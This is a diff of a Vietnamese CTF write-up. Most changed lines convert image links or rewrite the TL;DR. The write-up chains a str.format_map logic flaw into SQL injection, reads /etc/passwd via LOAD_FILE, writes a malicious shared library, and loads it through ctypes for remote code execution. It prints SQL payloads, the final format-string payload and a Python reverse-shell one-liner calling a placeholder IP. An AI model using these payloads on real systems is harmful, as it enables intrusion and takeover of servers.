@@ -1,45 +1,54 @@
 
 Đây thật sự là một challenge mà mình thích nhất trong đợt training :)) Không chỉ vì exploit chain hay giúp mình vận dụng được nhiều kĩ năng mà giao diện web cũng gợi mình khá nhiều liên tưởng😄
 
-![[Attachments/Pasted image 20261118215845.png]]
+![Pasted image 20261118215845](Attachments/Pasted%20image%2020261118215845.png)
 
 # TL;DR
 
-Mình giải challenge này bằng cách kết hợp nhiều lỗ hỏng khác nhau, mỗi lỗ hỏng lại mở ra nhiều điều thú vị để mình khám phá. Bắt đầu từ 
-**Business Logic Flaws -> SQL injection + Python Format String Gadget -> Arbitrary file write/read  -> Remote Code Execution 😳** 
+Challenge này là một exploit chain khá thú vị, nơi những lỗi tưởng chừng không liên quan lại có thể kết hợp với nhau để dẫn đến **Remote Code Execution (RCE)**.
+
+Mọi thứ bắt đầu từ một **Business Logic Flaw** trong cơ chế xử lý placeholder của `SQLQueryBuilder`. Bằng cách lợi dụng `str.format_map()` và khả năng truy cập attribute của Python, mình có thể bypass input validation và biến nó thành **SQL Injection**.
+
+Từ đây, mình tận dụng **Error-based SQLi** để đọc file và `INTO DUMPFILE` để ghi một malicious shared library (`.so`) lên server. Nhưng chỉ ghi file thôi thì chưa đủ để có RCE...
+
+Mảnh ghép cuối cùng chính là **Python Format String Gadget kết hợp với** **ctypes**. Dù `str.format_map()` không hỗ trợ gọi hàm trực tiếp, mình vẫn có thể lợi dụng cơ chế `__getattr__` của `ctypes.cdll` để load shared library vừa upload, kích hoạt constructor của nó và thực thi mã tùy ý trên server! 😳
+
+**Exploit Chain:**
+
+`Business Logic Flaw → Python Format String Gadget → Input Validation Bypass → SQL Injection → Arbitrary File Read/Write → ctypes Library Loading → RCE 🚀`
 
 # 1. Reconnaissance!!
 
 Mình thử spawn Instance mà recon qua thì dường như challenge chỉ có một chức năng duy nhất là đăng nhập:
 Nếu đăng nhập sai thì sẽ trả về 'Invalid Credentials':
-![[Attachments/Pasted image 20261118222452.png]]
+![Pasted image 20261118222452](Attachments/Pasted%20image%2020261118222452.png)
 
 Nếu có kí tự lạ thì sẽ trả về thông báo cấm:
-![[Attachments/Pasted image 20261118222649.png]]
+![Pasted image 20261118222649](Attachments/Pasted%20image%2020261118222649.png)
 
 Mình xem đến source code:
 Đầu tiên là **Dockerfile**, mình thấy các setup thông thường, flag được để ở /root/flag.txt, quyền 400 nên chỉ root được đọc:
-![[Attachments/Pasted image 20261118222917.png]]
+![Pasted image 20261118222917](Attachments/Pasted%20image%2020261118222917.png)
 
 Chuyển sang **start.sh**:
-![[Attachments/Pasted image 20261118224117.png]]
+![Pasted image 20261118224117](Attachments/Pasted%20image%2020261118224117.png)
 
 Logic của app được thể hiện trong **app.py**:
-![[Attachments/2026-11-18_22-46.png]]
+![2026-11-18_22-46](Attachments/2026-11-18_22-46.png)
 
 
 Ta thấy sự xuất hiện của class SQLQueryBuilder và InputValidator trong hàm authenticate:
-![[Attachments/Pasted image 20261118231027.png]]
+![Pasted image 20261118231027](Attachments/Pasted%20image%2020261118231027.png)
 
 
 Hàm InputValidate lưu cặp placeholder và giá trị tương ứng cùng với logic kiểm tra xem có thỏa mãn các yêu cầu bảo mật không, đáng chú ý là một lúc sau mình mới để ý có một typo nho nhỏ ở danh sách các kí tự cấm 😋
-![[Attachments/Pasted image 20261118231634.png]]
+![Pasted image 20261118231634](Attachments/Pasted%20image%2020261118231634.png)
 
 Đến với SQLQueryBuilder, đây mới là phần thú vị nhất:
-![[Attachments/Pasted image 20261118231844.png]]
+![Pasted image 20261118231844](Attachments/Pasted%20image%2020261118231844.png)
 
 Điểm thú vị nằm ở vòng lặp While:
-![[Attachments/Pasted image 20261118232041.png]]
+![Pasted image 20261118232041](Attachments/Pasted%20image%2020261118232041.png)
 
 Logic nhìn qua có thể thấy khá bình thường. Nhưng đọc kĩ chúng ta có thể thấy một điều rất bất thường.
 Bình thường nếu một dev bình thường muốn code để thay thế từ:
@@ -108,7 +117,7 @@ Thì từ:
 ```
 
 Sau đó, khi thấy vẫn còn placeholder dạng { ... } thì lại chạy tiếp vòng lặp và do không có value tương ứng nên sẽ gán thành rỗng và query trở thành:
-![[Attachments/Pasted image 20261118233521.png|700]]
+![700](Attachments/Pasted%20image%2020261118233521.png)
 
 Thật ra cái này trông có vẻ vô hại thật, vì chúng ta chưa thể kiểm soát được giá trị sẽ thay thế tương ứng,... hoặc là... có thể!?
 
@@ -142,16 +151,16 @@ Logic của nó kiểu:
 
 Tìm hiểu thêm về str.format_map(), ta thấy nó có cơ chế tương tự với str.format():
 Bạn đọc thêm ở: https://www.programiz.com/python-programming/methods/string/format_map
-![[Attachments/Pasted image 20261118234707.png]]
-![[Attachments/Pasted image 20261118234815.png]]
+![Pasted image 20261118234707](Attachments/Pasted%20image%2020261118234707.png)
+![Pasted image 20261118234815](Attachments/Pasted%20image%2020261118234815.png)
 
 Tìm hiểu về str.format() ta có thể thấy hàm này có một vài tính năng rất thú vị và đáng để tìm hiểu:
 Bạn đọc thêm tại: https://docs.python.org/3/library/string.html
 
-![[Attachments/Pasted image 20261118235152.png]]
+![Pasted image 20261118235152](Attachments/Pasted%20image%2020261118235152.png)
 
 Nhìn thì phức tạp nhưng bạn có thể xem phần ví dụ bên dưới:
-![[Attachments/Pasted image 20261118235232.png]]
+![Pasted image 20261118235232](Attachments/Pasted%20image%2020261118235232.png)
 
 Bạn có thể thấy, thật tuyệt vời khi chúng ta có thể làm một vài điều khá thù vị như kiểu truy cập attribute, gọi các hàm str(), repr(),.. của instance.
 
@@ -164,7 +173,7 @@ password : `
 
 (Sau khi vòng While chạy xong thì password sẽ thành` ' OR 1=1 -- -`)
 
-![[Attachments/Pasted image 20261119000522.png]]
+![Pasted image 20261119000522](Attachments/Pasted%20image%2020261119000522.png)
 
 Tuyệt vời!!! Mình đã đăng nhập được với tài khoản admin mặc dù vào thì chỉ hiện ra trang 404 nhưng cũng đã giúp mình xác nhận được SQL injection !!
 
@@ -199,7 +208,7 @@ if __name__ == "__main__":
 
 
 Oke, giờ đã có SQL injection, trên lý thuyết chúng ta có thể đọc toàn bộ Database rồi, nhưng dường như Database của app không có gì ngoài account admin:))
-![[Attachments/Pasted image 20261119001428.png]]
+![Pasted image 20261119001428](Attachments/Pasted%20image%2020261119001428.png)
 
 Lúc này nhìn vào source code ta còn thấy App còn in thẳng lỗi database nếu query bị lỗi:
 ```python
@@ -217,7 +226,7 @@ password :
 ```
 (Dịch ra: x' UNION SELECT 1,EXTRACTVALUE(1,CONCAT(0x7e,LOAD_FILE('/etc/passwd'),0x7e)),3-- -)
 
-![[Attachments/Pasted image 20261119002042.png]]
+![Pasted image 20261119002042](Attachments/Pasted%20image%2020261119002042.png)
 
 Ồ, vậy là có đọc file rồi, giờ thì mình thử viết file xem sao nhỉ?
 **Payload:**
@@ -231,7 +240,7 @@ Sau đó thử đọc file:
 ```
 x' UNION SELECT 1,EXTRACTVALUE(1,CONCAT(0x7e,LOAD_FILE('/var/run/mysqld/hehe.txt'),0x7e)),3-- -
 ```
-![[Attachments/Pasted image 20261119002717.png]]
+![Pasted image 20261119002717](Attachments/Pasted%20image%2020261119002717.png)
 
 Quá đã!!! Càng ngày càng gần với Flag rồi!!
 
@@ -243,24 +252,24 @@ username : { password.__class__.mro()[1].__subclasses__()[396]('echo HIII',shell
 password : abc
 ```
 đúng không? Mình cũng nghĩ vậy... Nhưng đáng tiếc là format_map() sẽ không thể truy cập đến method mà sẽ luôn coi cái đang được hướng tới là một attribute:
-![[Attachments/Pasted image 20261119015154.png]]
+![Pasted image 20261119015154](Attachments/Pasted%20image%2020261119015154.png)
 (Để hiểu hơn về payload trên bạn có thể đọc tại: https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html)
 
 
 Lúc này mình mới nhận ra một điểm là ở phần chèn thư viện có 2 thư viện chèn mà không được dùng tí nào:
-![[Attachments/Pasted image 20261119003635.png]]
+![Pasted image 20261119003635](Attachments/Pasted%20image%2020261119003635.png)
 
 Trong đó có cái ctypes cực kì đáng nghi :)) ngay phần cảnh báo trên đầu của doc cũng nói luôn:
 Bạn đọc thêm tại: https://docs.python.org/3/library/ctypes.html
-![[Attachments/Pasted image 20261119003737.png]]
+![Pasted image 20261119003737](Attachments/Pasted%20image%2020261119003737.png)
 
 Nhìn qua source code của cái này ta thấy có cdll là một object được tạo ra từ class LibraryLoader:
-![[Attachments/Pasted image 20261119105142.png]]
+![Pasted image 20261119105142](Attachments/Pasted%20image%2020261119105142.png)
 
 Điểm đặc biệt là class này có thuộc tính` __getattr__ ` sẽ gọi ngược lại lên CDLL rồi cuối cùng đi được đến `_load_library` và gọi đến `_dlopen`:
-![[Attachments/Pasted image 20261119105644.png]]
+![Pasted image 20261119105644](Attachments/Pasted%20image%2020261119105644.png)
 
-![[Attachments/Pasted image 20261119105802.png]]
+![Pasted image 20261119105802](Attachments/Pasted%20image%2020261119105802.png)
 
 Nếu không có sức mạnh khủng khiếp của AI thì mình không bao giờ tìm được các Gadget ảo ma thế này mất😭
 
@@ -279,7 +288,7 @@ Mình định thực thi mã trên server và bắt Reverse shell về trên VPS
 Payload mình lấy ở: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools
 Bạn có thể dùng công cụ tự động tạo payload Reverse shell ở: https://www.revshells.com/
 
-![[Attachments/Pasted image 20261119111924.png]]
+![Pasted image 20261119111924](Attachments/Pasted%20image%2020261119111924.png)
 
 Payload mình dùng: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IPv4>",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
 
@@ -372,4 +381,4 @@ Sau đó load thư viện này vào bằng cách gửi `{{a.__class__.__init__._
 username : admin
 password : {{a.__class__.__init__.__globals__[ctypes].cdll[{a.FORBIDDEN_CHARACTERS[7]}var{a.FORBIDDEN_CHARACTERS[7]}run{a.FORBIDDEN_CHARACTERS[7]}mysqld{a.FORBIDDEN_CHARACTERS[7]}hello123.so]}}{{a}}{a}
 ```
-![[Attachments/Pasted image 20261119115026.png]]![[Attachments/Pasted image 20261119115746.png]]
+![Pasted image 20261119115026](Attachments/Pasted%20image%2020261119115026.png)![Pasted image 20261119115746](Attachments/Pasted%20image%2020261119115746.png)
